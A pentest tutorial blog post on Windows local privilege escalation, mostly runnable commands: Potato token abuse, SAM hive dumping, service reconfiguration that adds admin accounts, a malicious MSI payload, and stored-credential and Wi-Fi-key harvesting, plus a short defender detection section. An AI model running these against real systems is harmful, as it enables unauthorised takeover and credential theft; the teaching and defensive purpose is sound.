---
title: "Windows Privilege Escalation Techniques That Still Work in 2026"
slug: "windows-privilege-escalation-techniques"
description: "Escalate from local user to SYSTEM on Windows 10/11 — token impersonation, unquoted paths, service hijacking, and the WinPEAS pivots that actually land."
date: 2026-04-21T11:00:00Z
lastmod: 2026-04-21T11:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["Tutorials"]
tags: ["windows", "privilege escalation", "post exploitation", "pentest"]
keywords: ["windows privesc", "windows privilege escalation", "winpeas"]
toc: true
cover:
  image: "/images/articles/windows-privilege-escalation-techniques.png"
  alt: "Windows privilege escalation techniques"
---

The Windows privilege escalation surface has narrowed since the days of unquoted-service-path goldmines, but it hasn't disappeared. Token abuse, misconfigured services, and overlooked AutoLogon registry entries still net SYSTEM on a meaningful percentage of corporate hosts.

## Step 0: Baseline

```powershell
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
```

`whoami /all` is the single most informative command. Look at:

- **Group memberships** — `BUILTIN\Administrators`? `Backup Operators`? `Remote Management Users`?
- **Privileges** — `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, `SeRestorePrivilege` are all paths to SYSTEM.

## Token Impersonation — The Service Account Killshot

Any user with `SeImpersonatePrivilege` (default for IIS app pools, MSSQL service accounts, many service identities) can pivot to SYSTEM with the *Potato* family.

```powershell
# Modern: GodPotato (works on Server 2012+ through 2022)
GodPotato.exe -cmd "cmd /c whoami > C:\Users\Public\who.txt"
# → NT AUTHORITY\SYSTEM
```

Older equivalents — RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer — each work on a narrower set of OS versions. GodPotato is the 2026 default.

## SeBackupPrivilege

This privilege lets you read any file regardless of ACLs. The classic exploitation: copy SYSTEM and SAM hives offline, extract hashes, replay.

```powershell
reg save HKLM\SYSTEM C:\Users\Public\system.hive /y
reg save HKLM\SAM    C:\Users\Public\sam.hive /y
```

Transfer to Kali → `secretsdump.py -system system.hive -sam sam.hive LOCAL` → local Administrator NT hash.

## Unquoted Service Paths

Still alive on legacy installers:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """
```

If a service is configured as `C:\Program Files\My Apps\Service Folder\service.exe` (unquoted) and you can write to `C:\Program Files\My Apps\`, drop `Service.exe` there. On service restart, Windows tries each space-separated prefix and runs your payload as the service account.

## Weak Service Permissions

```powershell
# Service binary writable by your user
sc qc vulnsvc
icacls "C:\path\to\service.exe"
# → BUILTIN\Users:(M)  <-- you can modify
```

Or **service configuration writable**:

```powershell
sc config vulnsvc binPath= "cmd /c net user pwned Pa55w0rd! /add && net localgroup administrators pwned /add"
sc start vulnsvc
```

## AlwaysInstallElevated

Forgotten group policy that installs MSI files as SYSTEM regardless of caller. Check:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both `0x1` → game over.

```bash
msfvenom -p windows/x64/exec CMD="net user atk Pa55w0rd! /add" -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

## Stored Credentials

```powershell
# Credential Manager
cmdkey /list

# Saved RDP creds
dir /s *.rdp 2>nul

# AutoLogon (still depressingly common)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattend.xml from imaging
findstr /si "password" C:\Windows\Panther\Unattend*.xml C:\sysprep.inf 2>nul

# WiFi profiles
netsh wlan show profile
netsh wlan show profile name="CORP-WIFI" key=clear
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

Look for tasks running as SYSTEM with executables you can overwrite. Or tasks with writable directories on PATH inside their command.

## DLL Hijacking

A SYSTEM process loading a DLL by name searches a specific order. If you can drop a malicious DLL in a writable directory earlier in the search order, you execute as SYSTEM at the next process start.

Procmon (Sysinternals) reveals every DLL load with `NAME NOT FOUND` — those are hijack candidates.

## UAC Bypass (User in Admin Group)

You're an Admin user but running with medium integrity. Common bypasses still working in 2026:

- **fodhelper.exe** registry hijack — UAC auto-elevation for ms-settings:
- **Sdclt.exe** — UAC auto-elevation, Folder-key hijack
- **ICMLuaUtil COM** elevation moniker — fileless

UACMe maintains the canonical, regularly updated list.

## Automated Tools

```powershell
# WinPEAS — most thorough
.\winPEASany.exe

# PowerUp — PowerShell, focused on services
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp — C# port of PowerUp
.\SharpUp.exe audit
```

## Detection Angles for Defenders

- **Service binary path modifications** — Event ID 7045 on changes; baseline expected paths.
- **Token-impersonation precursors** — RPC calls to NetSession, SchRpc — Sysmon Event ID 22/23.
- **Suspicious child processes from IIS / MSSQL** — `w3wp.exe → cmd.exe` is almost always bad.
- **MSI installs from user paths** — Event ID 1024 in `Application` log.
- **Anomalous `reg save HKLM\SAM`** — extremely high-fidelity signal.

## References

- [HackTricks Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PEASS-ng (WinPEAS)](https://github.com/peass-ng/PEASS-ng)
